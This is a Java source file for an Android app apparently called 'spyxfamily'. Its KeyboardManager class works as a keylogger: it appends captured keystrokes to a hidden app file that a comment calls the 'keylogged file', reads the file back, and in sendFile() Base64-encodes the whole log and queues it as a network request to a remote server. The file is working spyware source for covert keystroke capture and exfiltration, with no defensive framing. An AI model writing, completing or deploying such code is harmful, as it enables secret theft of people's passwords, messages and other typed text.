package com.example.spyxfamily;

import android.content.Context;
import android.util.Base64;

import com.android.volley.toolbox.JsonObjectRequest;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;

public class KeyboardManager {
    private static KeyboardManager instance;
    private static final String filename = "keyboard.dat";
    private FileInputStream fis;
    private FileOutputStream fos;
    private static Context ctx;



    private KeyboardManager(Context ctx)  {
        this.ctx = ctx;
    }

    public static KeyboardManager getInstance(Context ctx) {
        if (instance == null) {
            instance = new KeyboardManager(ctx);
        }
        return instance;
    }

    public void writeFile(int data) {
        try {
            fos = ctx.openFileOutput(filename, Context.MODE_APPEND);
            fos.write(data);
            fos.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    public void writeFile(String data) {
        try {
            fos = ctx.openFileOutput(filename, Context.MODE_APPEND);
            fos.write(data.getBytes());
            fos.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void flushFile() {
        try {
            fos = ctx.openFileOutput(filename, Context.MODE_PRIVATE);
            fos.flush();
            fos.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void readFile() {
        // Read keylogged file tostring
        try {
            fis = ctx.openFileInput(filename);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
        InputStreamReader inputStreamReader =
                new InputStreamReader(fis, StandardCharsets.UTF_8);
        StringBuilder stringBuilder = new StringBuilder();
        try (BufferedReader reader = new BufferedReader(inputStreamReader)) {
            String line = reader.readLine();
            while (line != null) {
                stringBuilder.append(line).append('\n');
                line = reader.readLine();
            }
            inputStreamReader.close();
            fis.close();
        } catch (IOException e) {
            // Error occurred when opening raw file for reading.
        } finally {
            String contents = stringBuilder.toString();
            System.out.println(contents);

        }
    }
    public void sendFile() {
        try {
            String strdata = new String(Base64.encode(readFileToBytes(), Base64.DEFAULT));
            RequestManager requestManager = RequestManager.getInstance(ctx.getApplicationContext());
            JsonObjectRequest jsonRequest = requestManager.buildRequest(strdata);
            if(jsonRequest != null) {
                // Send request
                requestManager.addToRequestQueue(jsonRequest);
            }
            else {
                // request building failed
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private byte[] readFileToBytes() throws IOException {
        fis = ctx.openFileInput(filename);
        byte[] bytes =   new byte[(int) fis.getChannel().size()];
        try{
            fis.read(bytes);
        }
        catch (IOException e) {
            // unable to read file
        }
        return bytes;
    }
}
